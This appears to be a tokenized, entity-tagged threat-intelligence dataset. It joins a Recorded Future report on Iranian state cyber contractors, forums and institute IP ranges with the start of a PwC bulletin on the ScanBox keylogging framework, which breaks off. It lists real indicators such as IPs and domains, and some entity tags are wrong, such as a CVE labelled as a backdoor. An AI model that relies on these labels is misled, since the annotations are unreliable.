additional
corroboration
,
we
assess
high
confidence
in
this
information
.

We
refer
to
this
individual
as
'
Insikt
Group's
source
'
in
other
sections
where
their
information
is
cited
.

Since
1979
,
Iran's
reactions
to
perceived
Middle
Eastern
adversaries
'
foreign
policy
has
been
a
study
in
the
use
of
proxies
.

Specifically
,
Israel
,
Saudi
Arabia
,
United
States
,
and
Iraq
have
been
frequent
targets
of
Iranianfunded
military
actions
,
most
recently
through
Houthi
rebels
in
Yemen
,
and
Hezbollah
everywhere
else
.

Since
2009
,
Iran
has
developed
proxies
in
the
cyber
domain
to
partially
obfuscate
government
fingerprints
from
foreign
attacks
.

Subsequent
to
starting
a
cyber
operations
program
in
2009
,
the
Iranian
government
had
an
immediate
need
to
use
the
program
in
the
fall
of
2012
after
U.S.
President
Obama
imposed
severe
financial
sanctions
on
Iran
,
including
removing
Iran
from
the
SWIFT
money
transfer
system
.



According
to
Insikt
Group's
source
,
the
Iranian
government
authorized
denial-of-service
attacks
on
America's
largest
financial
services
companies
as
an
immediate
response
to
the
sanctions
in
a
campaign
dubbed
Operation
Ababil
.

A
quick
response
was
top
priority
,
so
time
and
planning
were
forgone
luxuries
for
the
Iranian
government
.

Instead
,
the
Iranian
government
opted
for
speed
and
the
most
capable
actors
,
regardless
of
demonstrated
ideology
.

Similarly
,
a
year
later
in
the
fall
of
2013
,
Sheldon
Adelson
(
the
CEO
of
Sands
Corporation
)
publicly
suggested
that
the
United
States
should
attack
Iran
with
an
atomic
weapon
.

In
February
2014
,
Iran
launched
a
destructive
attack
on
the
Sands
Las
Vegas
Corporation
that
caused
significant
network
damage
.

This
was
the
second
public
Iranian
attack
campaign
on
an
American
business
,
where
the
response
called
for
speed
over
time
and
preparation
.

The
Iranian
attacks
in
2012
and
2014
were
in
contrast
to
the
relatively
slow
and
methodical
work
of
APT
33
,
APT
34
,
and
APT
35
,
developing
custom
malware
,
targeting
data
exfiltration
from
strategic
intelligence
targets
such
as
U.S.
military
contractors
,
Middle
East
energy
companies
,
and
university
research
networks
.

Comparing
Iranian
campaigns
—
methodical
versus
reactionary
.



Building
a
National
Capability
—
History
and
Relationships
Between
Proxies

The
Iranian
Revolution
replaced
the
Persian
monarchy
and
transitioned
the
Shah's
power
to
the
Islamic
Republic
,
led
by
Ayatollah
Ruhollah
Khomeini
.

Loyalty
to
the
resulting
theocracy
was
defined
by
alignment
to
the
Supreme
Leader's
moral
precepts
.

The
new
leaders
of
Iran
also
established
an
intelligence
and
security
organization
,
the
Islamic
Revolutionary
Guard
Corps
(
IRGC
)
,
'
charged
with
defending
the
Islamic
Republic
against
internal
and
external
threats
.
'
Currently
,
the
IRGC
is
Iran's
premier
security
organization
and
possesses
an
army
,
navy
,
and
air
force
,
and
manages
'
Iran's
ballistic
missile
arsenal
and
irregular
warfare
operations
through
its
elite
Quds
Force
and
proxies
such
as
Hezbollah
.
'

The
IRGC
has
a
vast
domestic
information
security
and
monitoring
mandate
,
as
well
as
broad
foreign
mission
,
and
has
been
linked
to
cyberattacks
against
Western
institutions
since
at
least
2011
.

According
to
Insikt
Group's
source
,
during
the
2009
Green
Revolution
,
Gerdab.ir B_url.unknown
emerged
as
the
IRGC's
domestic
hacking
group
tasked
with
targeting
opposition
news
websites
and
individuals
considered
immoral
by
the
regime
.

Iranian
hackers
targeting
Iranian
government
resources
(
one
example
was
defacing
Khamanei.ir B_url.unknown
)
were
identified
by
Gerdab
and
imprisoned
.

Gerdab
continues
to
act
as
the
Iranian
government's
internal
censor
.

Following
the
Green
Revolution
,
the
Iranian
government
considered
adding
a
formal
offensive
cyber
component
to
its
existing
intelligence
apparatus
,
and
was
forced
to
address
a
personnel
problem
.

Iran
needed
a
talented
,
but
politically
and
religiously
reliable
workforce
.

Stuxnet
and
scientist
assassinations
reminded
Iran
of
the
efficacy
of
Mossad
and
CIA
programs
,
and
according
to
Insikt
Group's
source
,
fervent
religious
ideology
was
the
only
way
to
demonstrate
loyalty
and
build
trust
.

The
emergence
of
the
Iranian
Cyber
Army
(
ICA
)
as
an
extension
of
the
IRGC
was
an
initial
attempt
by
the
Islamic
Republic
at
conducting
internationally
focused
operations
.

These
operations
were
a
departure
from
Gerdab's
focus
on
maintaining
domestic
moral
values
and
defending
government
rhetoric
.

In
2011
,
the
IRGC's
ICA
formed
the
foundation
of
the
Khaybar
Center
for
Information
Technology
.

According
to
a
former
IRGC
cyber
commander
,
the
Khaybar
Center
was
established
in
2011
and
has
been
linked
to
a
number
of
attacks
against
the
United
States
,
Saudi
Arabia
,
and
Turkey
.

Even
today
,
the
balance
between
ideology
and
cyber
skills
remains
problematic
.

One
example
of
the
conflict
between
ideology
and
skill
was
Mohammad
Hussein
Tajik
,
a
former
cyber
commander
within
the
IRGC
.

According
to
Insikt
Group's
source
,
Tajik's
father
maintained
a
strong
religious
background
and
was
a
veteran
of
Iran's
ministry
of
intelligence
.

Yet
Tajik
was
arrested
and
killed
because
the
Iranian
government
feared
that
Tajik
was
not
ideologically
aligned
and
posed
a
betrayal
and
flight
risk
.



Following
the
Green
Revolution
,
Iran's
government
needed
to
quickly
improve
its
cyber
capabilities
,
but
according
to
Insikt
Group's
source
,
the
talent
was
primarily
young
and
focused
on
financial
benefits
.

This
motivation
bred
government
mistrust
,
as
the
Islamic
Republic
feared
that
the
financially
motivated
could
be
bought
by
foreign
intelligence
services
.

Additionally
,
many
of
the
original
Iranian
hackers
responsible
for
mass
defacements
hated
authority
and
lacked
the
discipline
necessary
for
government
work
.

According
to
Insikt
Group's
source
,
the
government
answer
was
a
tiered
approach
,
with
a
network
of
people
unofficially
associated
with
the
IRGC
and
Iranian
government
—
a
type
of
ideologically
aligned
middle
management
—
that
were
loyal
to
the
regime
and
demonstrated
sufficient
religious
commitment
.

This
middle
tier
translated
intelligence
priorities
into
segmented
cyber
tasks
which
were
then
bid
out
to
multiple
contractors
.

Sometimes
the
contractors
would
compete
with
each
other
,
sometimes
they
would
work
together
,
but
payment
was
only
made
once
the
objective
was
completed
.

The
result
was
(
and
presently
remains
)
a
quasi-capitalistic
system
that
pitted
contractors
against
each
other
for
influence
with
the
Iranian
government
.

In
the
Islamic
Republic
,
influence
can
lead
to
security
and
wealth
,
but
it
can
also
lead
to
a
false
sense
of
security
(
no
one
is
above
being
imprisoned
and
questioned
at
any
given
time
)
.

Thus
,
contractors
must
learn
to
play
the
game
—
enough
surface-level
adherence
to
the
regime's
ideology
—
to
gain
temporary
reprieves
from
suspicion
long
enough
to
be
given
contracted
work
.

To
the
Iranian
government
,
ideology
is
more
important
than
skills
.

Deep
belief
in
the
Ayatollah's
precepts
and
the
government's
goals
helps
to
avoid
defections
and
traitors
.

Obfuscating
Iranian
government
involvement
in
offensive
campaigns
.



Today
,
based
on
ongoing
contact
between
Insikt
Group's
source
and
Iranian
hackers
,
it
is
estimated
that
there
are
over
50
organizations
vying
for
government-sponsored
offensive
cyber
projects
.

Only
the
best
teams
succeed
,
are
paid
,
and
remain
in
business
.

The
government
does
its
best
to
compartmentalize
—
one
job
might
be
creating
a
remote
code
exploit
(
RCE
)
for
a
popular
software
application
,
while
another
job
might
be
using
the
RCE
and
establishing
persistent
unauthorized
access
.

Two
different
contractors
(
or
more
)
are
typically
required
to
complete
the
government-defined
objective
.

Public
knowledge
has
also
established
that
Iranian
academic
institutions
play
a
contractor-like
role
.

Specific
examples
include
Shahid
Beheshti
University
(
SBU
)
and
the
Imam
Hossein
University
(
IHU
)
,
which
have
comprehensive
science
and
technology
departments
attracting
some
of
the
best
academic
talent
in
Iran
.

In
fact
,
the
SBU
has
a
specific
cyberspace
research
institute
dedicated
to
such
matters
.

In
fact
,
the
SBU
has
a
specific
cyberspace
research
institute
dedicated
to
such
matters
,
and
the
IHU
was
founded
by
the
IRGC
.

As
the
Mabna
Institute
indictments
highlight
,
despite
the
lifting
of
sanctions
and
an
appetite
to
re-engage
with
the
international
community
,
Iran
has
continued
a
subversive
and
aggressive
global
cyber
operations
campaign
.

This
ongoing
campaign
,
which
targets
universities
for
scientific
and
technological
intellectual
property
theft
,
demonstrates
a
fundamental
lack
of
trust
in
the
international
agreements
,
including
the
Joint
Comprehensive
Plan
of
Action
(
JCPOA
)
.

Relationship
Between
the
Iranian
Government
,
Contractors
,
and
Security
Forums
Clearsky
,
FireEye
,
Symantec
,
and
PhishLabs
have
all
performed
significant
research
on
Iranian
nation-state-sponsored
campaigns
that
provide
historical
insight
into
technical
capabilities
and
relationships
between
the
Iranian
government
and
contractors
.

The
work
of
the
aforementioned
security
companies
and
recent
U.S.
Department
of
Justice
indictments
provides
consistent
evidence
that
Iranian
government-sponsored
offensive
campaigns
are
executed
by
contractors
.

FireEye
disclosed
that
the
Nasr
Institute
was
an
APT
33
contractor
in
an
operation
that
used
publicly
available
backdoors
and
remote
access
trojans
.

The
handle
'
xman_1365_x
'
(
self-identified
on
security
forums
as
Mahdi
Honarvar
)
was
found
by
FireEye
in
malware
artifacts
,
which
open
sources
linked
to
the
Nasr
Institute
.

Previously
,
Nasr
Institute
had
been
associated
with
Operation
Ababil's
distributed
denial-of-service
attacks
against
American
banks
,
an
organization
which
a
U.S.
Department
of
Justice
indictment
confirms
had
been
hired
to
build
attack
infrastructure
by
the
Iranian
government
.

The
actor
xman_1365_x
was
then
linked
to
a
security
company
called
Kavosh
Security
via
OSINT
by
Iran
Cyber
News
Agency
.

The
actor
was
linked
to
a
destructive
operation
,
which
used
NewsBeef  B_malware.infosteal
and
StoneDrill  B_malware.backdoor
malware
families
.

According
to
Kaspersky
,
the
latter
data
wiping
operation
targeted
sectors
across
Saudi
Arabia
and
Europe
.



Command
and
control
(
C2
)
domains
used
by
StoneDrill  B_malware.backdoor
and
NewsBeef  B_malware.infosteal
in
Kaspersky's
findings
were
found
to
share
an
SSL
certificate
,
which
surfaced
an
additional
three
domains
in
research
by
the
Iran
Cyber
News
Agency
.

WHOIS B_url.normal
information
was
then
connected
via
open
sources
to
Imam
Hossein
University
(
IHU
)
.

IHU
was
named
in
sanctions
by
the
U.S.
Treasury
'
for
providing
,
or
attempting
to
provide
technological
,
or
other
support
for
and
services
in
support
of
the
IRGC
.
'

Additional
publicly
known
Iranian
contractors
include
ITSecTeam
(
ITSEC
)
and
Mersad
Company
,
also
linked
to
Operation
Ababil
.

The
links
between
the
Iranian
government
and
contractors
are
well
documented
;
however
,
the
identity
of
specific
groups
and
individuals
within
the
Iranian
government
and
IRGC
responsible
for
offensive
cyber
campaigns
is
murky
,
as
is
the
relationship
between
contractors
and
security
forums
.

Yet
,
our
research
and
analysis
suggest
that
Iranian
security
forums
may
play
a
role
in
staffing
and
knowledge
sharing
for
Iranian
contractors
.

First
,
FireEye
referenced
the
publicly
available
ALFA  B_malware.backdoor
TEaM  I
Shell I
in
APT33
spear B_malware.infosteal
phishing  I
email
campaigns
.

The
ALFA  B_malware.backdoor
Shell I
is
discussed
in
multiple
web
locations
,
including
Ashiyane
and
Iranian
Dark
Coders
Team
Forum
.

ALFA  B_malware.backdoor
TEaM  I
shell I
history
.



Second
,
xman_1365_x
created
an
Ashiyane
profile
on
August
8
,
2010
,
allegedly
not
long
after
Ashiyane
temporarily
became
the
primary
security
forum
in
Iran
,
following
Behrooz
Kamalian's
visit
to
prominent
cleric
,
Ayatollah
Naser
Makarem
Shirazi
.

xman_1365_x
created
an
Ashiyane
profile
in
2010
.

Finally
,
according
to
Insikt
Group's
source
,
Iranian
contractor
ITSEC
specifically
employed
hackers
from
the
respective
online
forums
Simorgh
and
Delta
Security
.

Further
,
Hossein
Asgari
,
a
self-proclaimed
Iranian
hacker
,
managed
the
Simorgh
forum
and
worked
with
his
father
,
who
was
employed
by
the
IRGC
.

Source
:
http://hackingscripts.com/simattacker-shell/  B_url.unknown



Zone-h
captured
website
defacements
committed
by
Hossein
Asgari

Source
:
http://www.zone-h.org/mirror/id/4479919 B_url.unknown

According
to
Insikt
Group's
source
,
to
find
and
retain
the
best
offensive
cyber
talent
,
Iranian
government
contractors
are
forced
to
mine
closed-trust
communities
.

The
links
between
the
forums
and
contractors
may
illustrate
that
the
trust
communities
begin
with
the
Iranian
security
forums
.

Analyzing
Iranian
Cyber
Institute
Internet
Traffic
Insikt
Group
analyzed
internet
traffic
relating
to
various
institutes
affiliated
with
the
Iranian
cyber
ecosystem
from
March
1
,
2018
to
April
30
,
2018
.

Our
goal
was
to
determine
whether
any
of
these
institutes
had
forecasted
Iran's
intentions
in
cyberspace
leading
up
to
the
U.S.
decision
to
withdraw
from
the
2015
JCPOA
.

This
is
Insikt
Group's
first
profiling
of
internet
activity
for
Iranian
cyber
institutes
.

While
we
cannot
assess
whether
this
level
of
activity
is
typical
or
not
,
monitoring
it
over
time
to
determine
changes
in
response
to
international
pressure
could
be
revealing
.

Cyberspace
Research
Institute
of
Iran

Iran's
Cyberspace
Research
Institute
(
CSRI
)
is
a
research
center
affiliated
with
the
prestigious
Shahid
Beheshti
University
in
Iran
.

The
institute
commands
a
significant
proportion
of
the
university's
allocated
IP
space
,
with
no
fewer
than
eight
/
24
IP
ranges
registered
to
the
CSRI
in
Iran
,
according
to
regional
RIPE
NCC
records
.

The
ranges
are
listed
below
:



netname
inetnum_start
inetnum_end
country
mnt-by
created

CyberSpace-Research-Institute
31.184.130.0  B_ip.unknown
31.184.130.255  B_ip.unknown

CyberSpace-Research-Institute
31.184.131.0  B_ip.unknown
31.184.131.255  B_ip.unknown

CyberSpace-Research-Institute
31.184.132.0  B_ip.unknown
31.184.132.255  B_ip.unknown

CyberSpace-Research-Institute
31.184.133.0  B_ip.unknown
31.184.133.255  B_ip.unknown

CyberSpace-Research-Institute
31.184.134.0  B_ip.unknown
31.184.134.255  B_ip.unknown

CyberSpace-Research-Institute
31.184.135.0  B_ip.unknown
31.184.135.255  B_ip.unknown

MNT-MABNA
2013-08-31T06:02:20Z

MNT-MABNA
2013-09-15T04:57:21Z

MNT-MABNA
2013-09-15T05:02:03Z

MNT-MABNA
2013-09-15T05:10:24Z

MNT-MABNA
2013-09-15T05:11:21Z

MNT-MABNA
2017-05-23T05:30:27Z

Source
:
RIPE
NCC
database
,
ripe.net  B_url.normal
.

Insikt
Group
identified
several
activities
of
concern
emanating
from
these
ranges
.

We
discovered
over
400
previously
unreported
SSH
sessions
between
CSRI
ranges
and
Spanish
government
and
university
networks
from
April
4
,
2018
to
April
9
,
2018
.

These
exchanges
involved
the
transfer
of
a
large
volume
of
data
between
the
two
networks
.

The
Spanish
networks
resolved
to
departments
supporting
the
digital
transformation
of
Spanish
public
services
and
multi-disciplined
universities
.

Direct
network
connectivity
between
the
Iranian
and
Spanish
institutions
demonstrates
that
they
either
have
a
deep
academic
relationship
and
are
sharing
data
with
one
another
,
or
the
large
transfer
of
data
from
the
Spanish
institutes
is
unwarranted
.

It
is
unlikely
that
CSRI
would
have
a
valid
business
interest
with
Spanish
government
departments
,
so
the
large
volume
of
data
transferred
between
the
two
networks
over
such
a
short
period
of
time
is
a
conspicuous
indicator
of
possibly
malicious
activity
.

Throughout
April
,
Iran's
CSRI
simultaneously
demonstrated
an
increased
interest
in
the
Philippine
Department
of
Science
&
Technology
(
DOST
)
.

Similar
to
the
Spanish
network
interactions
,
very
large
data
volumes
were
exchanged
between
the
two
networks
,
denoting
strong
interest
.

This
level
of
engagement
and
interaction
,
particularly
in
light
of
the
reduction
of
sanctions
,
and
the
thawing
of
relations
between
Iran
and
the
West
following
the
2015
JCPOA
,
was
expected
between
academia
.

In
fact
,
in
2015
and
2017
,
Philippine
and
Spanish
universities
agreed
to
expand
scientific
cooperation
with
Iranian
institutions
.

However
,
given
CSRI's
background
,
Iran's
demonstrated
interest
in
using
cyber
operations
to
steal
academic
and
intellectual
property
,
and
our
evidence
of
ongoing
campaigns
targeting
universities
for
theft
worldwide
,
we
assess
that
this
activity
between
CSRI
and
these
Spanish
and
Philippine
universities
may
be
malicious
.



CSRI
was
also
observed
in
a
large
number
of
events
dispatching
the
Parsijoo
bot
to
crawl
websites
of
interest
.

According
to
Wikipedia
,
Parsijoo.ir B_url.normal
is
the
second
most
popular
search
engine
in
Iran
after
Google
and
it
uses
the
Parsijoobot
to
crawl
websites
for
indexing
purposes
.

During
our
research
,
we
noted
repeated
crawls
of
a
specialist
Canadian-Iranian
immigration
website
,
www.itc-canada[.]com  B_url.normal
,
using
Parsijoo
bot
from
CSRI
IP
ranges
.

The
crawls
were
observed
throughout
our
data
period
from
early
March
continuing
right
through
to
the
end
of
April
,
suggesting
a
strong
,
persistent
interest
in
this
particular
site
.

Finally
,
we
identified
CSRI
interacting
with
IPs
registered
to
Ravand
Cybertech
Inc
.

Ravand
Cybertech
offers
,
via
its
website
ravand[.]com  B_url.normal
,
cloud
hosting
solutions
,
among
other
services
.

Ravand
Cybertech
has
strong
ties
to
the
Iranian
regime
.

Historically
,
it
hosted
the
website
of
the
conservative
news
agency
Fars
which
is
affiliated
with
the
Iranian
military
.

The
company's
registered
IP
ranges
sit
under
AS12212
with
the
following
prefixes
ranged
198.55.48.0 B_ip.unknown
–
198.55.61.255 B_ip.unknown
,
198.55.63.0 B_ip.unknown
–
198.55.63.255 B_ip.unknown
and
207.176.216.0 B_ip.unknown
–
207.176.219.255 B_ip.unknown
.

Ravand
Cybertech
hosted
a
number
of
domains
used
by
an
Iranian
Ministry
of
Intelligence
Services
(
MOIS
)
agent
,
Massoud
Khodabandeh
,
in
a
disinformation
campaign
conducted
in
Western
media
.

The
campaign
attempted
to
discredit
and
demonize
the
main
Iranian
opposition
party
,
the
People's
Mojahedin
Organization
of
Iran
/
Mojahedin-e
Khalq
(
PMOI
/
MEK
)
.

According
to
an
opinion
piece
written
for
The
Hill
,
the
websites
were
found
by
the
Pentagon
to
be
created
by
order
from
Tehran
.

Ravand
Cybertech
was
identified
as
being
an
'
Iranian
state-run
'
company
,
which
hosted
fake
news
sites
aimed
at
disseminating
Iranian
propaganda
to
undermine
the
efforts
of
Iranian-American
lobbyists
.

Based
on
the
volume
of
activity
observed
during
our
research
,
we
assess
the
CSRI
may
be
engaged
in
supporting
the
malicious
disinformation
activities
of
Ravand
Cybertech
.

Imam
Hossein
University
(
Imam
Hussein
University
)

The
Imam
Hossein
Comprehensive
University
(
IHU
)
is
an
Iranian
university
based
in
Tehran
that
is
affiliated
with
the
Iranian
Revolutionary
Guard
Corps
(
IRGC
)
,
the
Iranian
Ministry
of
Science
,
Research
and
Technology
,
and
the
Iranian
Ministry
of
Defense
and
Armed
Forces
Logistics
.



Our
research
focused
on
the
publicly
noted
IP
ranges
for
the
university
,
listed
below
:
netname
inetnum_start
inetnum_end
country
mnt-by
created

IMAMHOSSEINUNI
217.218.175.0 B_ip.unknown
217.218.176.255 B_ip.unknown

IHUO
78.39.164.160 B_ip.unknown
78.39.164.167 B_ip.unknown

AS12880-MNT
2008-12-28T10:20:37Z

AS12880-MNT
2015-09-05T04:48:32Z

Source
:
RIPE
NCC
database
,
ripe.net  B_url.normal
.

During
our
research
,
we
found
that
IHU
was
also
very
interested
in
Spanish
higher
educational
establishments
and
specific
government
departments
.

In
fact
,
two
of
the
same
Spanish
establishments
exchanged
high
data
volumes
with
the
IHU
source
range
IPs
.

Further
web
browsing
activity
from
IHU
ranges
was
noted
to
the
website
of
a
U.S.-based
multinational
engineering
software
company
,
Gamma
Technologies
.

The
browsing
activity
was
centered
on
its
GT-SUITE
software
.

Gamma
Technologies
specializes
in
the
development
of
simulation
software
for
a
wide
variety
of
worldwide
industries
,
including
power
generation
.

Mabna
Institute

As
previously
detailed
,
the
Mabna
Institute
was
publicly
identified
in
an
FBI
indictment
as
a
front
company
engaged
in
hostile
state-sponsored
cyberespionage
on
behalf
of
the
Iranian
state
.

Our
OSINT
research
identified
a
single
domain
,
mabna-ins[.]ir  B_url.unknown
,
which
could
correspond
to
the
group
.

The
domain
was
previously
hosted
on
an
Iranian
IP
5.144.130[.]23  B_ip.unknown
and
since
April
22
,
2017
,
points
at
German
VPS
IP
144.76.87[.]86  B_ip.unknown
.

This
VPS
also
hosts
over
2,000
other
domains
,
most
of
which
are
.ir
domains
.



Source
:
mabna-ins[.]ir  B_url.unknown

Intent
,
Scenarios
for
Retaliation
,
and
Recommendations

According
to
the
terms
of
the
JCPOA
,
Tehran
agreed
to
restrictions
on
its
nuclear
weapons
program
in
exchange
for
sanctions
relief
.

However
,
various
provisions
of
the
accord
expire
at
different
times
over
the
next
25
years
,
with
some
expiring
as
soon
as
2025
.

On
May
8
,
2018
,
President
Trump
decided
not
to
renew
the
waivers
suspending
some
U.S.
sanctions
against
Iran
and
initiated
a
de
facto
U.S.
withdrawal
from
the
agreement
.

As
a
result
of
this
action
,
we
assess
that
Iran
will
likely
respond
quickly
by
launching
destructive
attacks
on
American
,
European
,
and
rival
nation
(
countries
such
as
Saudi
Arabia
and
Israel
)
businesses
.

Conversely
,
Iran
may
also
retaliate
(
exclusively
or
in
conjunction
with
destructive
attacks
)
through
cyber
proxies
in
more
methodical
and
sustained
campaigns
.

Given
the
impact
of
re-applied
and
expanded
economic
sanctions
,
it
is
likely
that
American
,
European
,
and
rival
nation
businesses
will
also
be
targeted
with
more
sustained
destructive
attacks
.



As
documented
above
,
when
pursuing
quick-turn
cyber
operations
,
the
Iranian
regime
will
weigh
religious
and
political
reliability
against
offensive
skills
.

The
best
operators
are
not
always
the
most
devout
or
loyal
to
the
regime
and
we
assess
that
,
in
this
case
,
the
IRGC
may
forgo
careful
contractor
selection
and
planning
in
an
attempt
to
deliver
a
destructive
attack
within
a
short
period
of
time
.

Further
,
our
research
indicates
that
because
of
the
need
for
a
quick
response
,
the
Islamic
Republic
may
utilize
contractors
that
are
less
politically
and
ideologically
reliable
(
and
trusted
)
and
as
a
result
,
could
be
more
difficult
to
control
.

It
is
possible
that
this
dynamic
could
limit
the
ability
of
the
government
to
control
the
scope
and
scale
of
these
destructive
attacks
once
they
are
unleashed
.

Western
businesses
should
closely
monitor
geopolitical
events
initiated
by
the
United
States
or
Europe
that
affect
Iran
.

As
demonstrated
above
,
Western
businesses
are
the
logical
victims
of
Iranian
retaliation
for
perceived
American
policy
transgressions
;
specifically
businesses
in
financial
services
,
government
departments
,
critical
infrastructure
providers
,
and
oil
and
energy
sectors
.

In
addition
to
carefully
monitoring
Iranian
geopolitical
developments
,
tracking
emerging
tactics
,
techniques
,
and
procedures
(
TTPs
)
on
Ashiyane
,
specifically
,
is
wise
for
any
Western
commercial
threat
intelligence
program
to
determine
the
efficacy
of
existing
security
controls
.



About
Recorded
Future

Recorded
Future
arms
security
teams
with
the
only
complete
threat
intelligence
solution
powered
by
patented
machine
learning
to
lower
risk
.

Our
technology
automatically
collects
and
analyzes
information
from
an
unrivaled
breadth
of
sources
and
provides
invaluable
context
in
real
time
and
packaged
for
human
analysis
or
integration
with
security
technologies
.

©
Recorded
Future
,
Inc
.

All
rights
reserved
.

All
trademarks
remain
property
of
their
respective
owners
.

www.recordedfuture.com  B_url.normal
@RecordedFuture
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
ScanBox B_malware.infosteal
II
Date
:
Contact
:
Reference
:
TLP
:
2015-02-24
threatintelligence@uk.pwc.com B_url.unknown
CTO-TIB-20150224-01A
WHITE
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
1
.

A
deeper
look
into
ScanBox B_malware.infosteal
Please
e-mail
us
at
threatintelligence@uk.pwc.com B_url.unknown
for
a
version
of
this
report
with
additional
indicators
that
you
are
welcome
to
distribute
so
long
as
it
is
not
on
public
channels
(
TLP-GREEN
)
.

We
have
observed
actors
amending
the
ScanBox B_malware.infosteal
framework
to
evade
existing
public
signatures
,
detailed
below
.

Overview
Security
researchers
have
often
made
the
mistake
of
assuming
that
when
a
specific
tool
was
observed
being
used
in
espionage
attacks
,
it
was
representative
of
activity
of
a
single
actor
.

More
frequently
,
however
,
many
are
now
identifying
that
distinct
groups
of
attackers
are
sharing
their
toolsets
,
just
as
in
the
cybercrime
world
.

One
such
toolset
,
the
ScanBox B_malware.infosteal
framework
,
is
now
shared
between
a
number
of
groups
who
conduct
espionage
attacks
.

Evidence
suggests
that
these
groups
include
those
behind
the
recent
Forbes
and
Anthem
attacks
.

This
short
paper
outlines
our
current
perspectives
on
the
previously
discussed
espionage
groups
currently
using
the
framework
and
a
hint
that
a
5th
player
is
getting
in
on
the
game
.

ScanBox B_malware.infosteal
performs
keylogging
of
users
when
they
visit
a
compromised
website
,
without
requiring
malware
to
be
deployed
,
and
can
collect
a
great
deal
of
information
which
can
be
used
to
tailor
future
attacks
In
October
we
published
some
details
of
the
ScanBox B_malware.infosteal
tool
set
.

Since
then
we
have
encountered
24
additional
sites
compromised
with
the
framework
.

Over
this
time
we
have
observed
changes
to
the
code
and
novel
techniques
for
executing
.

We
have
also
received
a
number
of
tip
offs
from
other
researchers
,
as
well
as
queries
from
victims
who
were
directly
targeted
by
those
using
the
framework
.

We
would
like
to
extend
our
thanks
to
these
individuals
for
their
contributions
towards
this
research
.

Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Who
's
using
it
,
and
who
's
being
targeted
?

The
following
diagram
shows
the
links
in
tools
and
targets
between
the
groups
discussed
in
our
previous
blog
,
but
newer
information
has
since
come
to
light
which
allows
us
to
more
accurately
associate
these
groups
with
known
threat
actors
:
Between
these
clusters
,
we've
seen
strategic
web
compromises
designed
to
target
users
in
the
following
countries
:
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Variations
on
the
framework
Since
our
last
post
there
have
been
several
alterations
to
the
ScanBox B_malware.infosteal
code
base
,
including
new
modules
,
changes
to
avoid
signature
based
detection
,
as
well
as
extra
techniques
to
try
to
identify
whether
those
being
scanned
are
real
machines
or
researchers
.

Fears
of
proliferation
In
some
cases
we
have
been
able
to
watch
developers
update
and
test
variants
of
the
framework
,
and
even
come
across
server-side
code
being
tested
by
budding
hackers
.

Our
findings
are
detailed
below
.

Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
2
.

Updates
to
the
ScanBox B_malware.infosteal
Framework
Following
on
from
our
previous
post
on
ScanBox1 B_malware.infosteal
,
we
have
watched
the
clusters
of
activity
outlined
with
close
interest
,
as
well
as
keeping
an
eye
on
new
adopters
of
the
ScanBox B_malware.infosteal
framework
.

For
those
who
did
n't
read
our
last
entry
on
the
framework
,
nor
the
excellent
work
by
Jaime
Blasco2
which
preceded
it
,
ScanBox B_malware.infosteal
is
a
framework
written
in
JavaScript
and
PHP
which
allows
an
attacker
to
perform
reconnaissance
and
key
logging
of
visitors
to
compromised
websites
without
requiring
any
malware
to
be
downloaded
or
installed
.

The
framework
has
remained
in
use
since
initial
analyses
were
published
,
and
further
analysis
of
the
code
,
public
reporting
,
as
well
as
the
infrastructure
used
to
host
ScanBox B_malware.infosteal
infections
has
given
us
a
better
picture
of
some
of
the
clusters
of
activity
we
identified
in
our
earlier
blog
.

Technical
Updates
In
addition
to
the
four
websites
we
previously
identified
hosting
the
malicious
code
,
we've
now
identified
a
further
24
websites
hosting
the
framework
.

Anonymised
data
relating
the
countries
and
sectors
affected
are
given
in
appendix
A
.

Broadly
,
the
ScanBox B_malware.infosteal
framework
codebase
has
remained
the
same
,
however
there
are
slight
nuances
in
some
aspects
of
the
code
,
or
in
the
software
attackers
choose
to
search
for
.

Software
checks
In
cases
where
the
attackers
have
included
software
checks
within
their
ScanBox B_malware.infosteal
code
,
it
tends
to
be
for
the
same
original
list
of
filenames
(
Appendix B_malware.unknown
C I
)
.

In
some
cases
the
attackers
customise
the
list
,
presumably
based
on
the
things
they
're
expecting
to
find
.

For
example
,
adding
or
removing
additional
security
products
based
on
the
predominant
software
providers
in
their
target
region
.

It
's
also
worth
noting
that
the
standard
list
includes
quite
a
lot
of
software
which
is
less
relevant
to
security
(
examples
include
WinRAR
,
iTunes
and
WinZip
)
.

Some
of
these
may
be
included
in
order
to
help
the
attackers
to
try
and
identify
real
victims
vs
researchers
/
sandboxes
/
honeypots
.

An
example
list
is
shown
in
the
following
screenshot
:
1
http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
2
https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
checkDrives
In
one
cluster
of
ScanBox B_malware.infosteal
activity
,
instead
of
checking
for
specific
files
as
per
the
method
above
,
the
attackers
have
implemented
a
different
method
of
tracking
files
and
drives
present
on
the
victim
machine
.

The
first
piece
of
new
functionality
is
that
the
attackers
build
a
possible
list
of
drive
names
(
A-Z
)
and
scan
for
the
existence
of
each
drive
:
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
checkFolders
They
do
not
check
files
directly
either
,
instead
,
checking
for
the
presence
of
a
list
of
folder
names
:
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
In
this
case
,
rather
than
determining
what
security
software
is
present
,
this
check
would
mainly
be
useful
in
assisting
the
attacker
with
identifying
the
victim
's
operating
system
.

This
could
then
be
used
to
tailor
future
attacks
(
i.e.
should
I
deploy
malware
which
can
bypass
UAC
?

Should
I
send
malicious
documents
targeting
CVE-2012-0158 B_malware.backdoor
or
not
?
)
.

Also
,
bizarrely
the
attackers
check
the
path
'
Program
Files
(
x80236
)
'
–
if
anyone
knows
what
this
corresponds
to
,
please
get
in
touch
and
let
us
know
.

Avoiding
analysis
?

As
we
stated
earlier
,
some
of
the
features
of
the
original
ScanBox B_malware.infosteal
code
were
probably
designed
to
help
those
analysing
results
distinguish
between
honeypots
/
analysis
environments
and
real-world
victims
.

The
newly
added
variables
include
:


colorDepth
–
This
may
help
to
